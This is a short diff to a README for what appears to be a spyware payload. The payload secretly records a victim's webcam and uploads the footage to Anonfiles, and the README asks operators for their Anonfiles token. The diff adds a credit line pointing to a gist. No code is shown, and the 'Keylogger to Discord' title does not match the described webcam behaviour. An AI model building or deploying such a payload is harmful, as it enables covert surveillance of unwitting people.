@@ -1,6 +1,7 @@
 # Keyloger 2 Discord
 
 This payload records the users Webcam and uploads the recording to Anonfiles using the DirectX and DShowNET assemblies
+It's based on [This gist](based on https://gist.github.com/quantumcore/3926dcb0215d802c0b48ddc640522e45)
 
 You must edit the following parameters on the payload:
 * anontoken - your AnonfilesToken
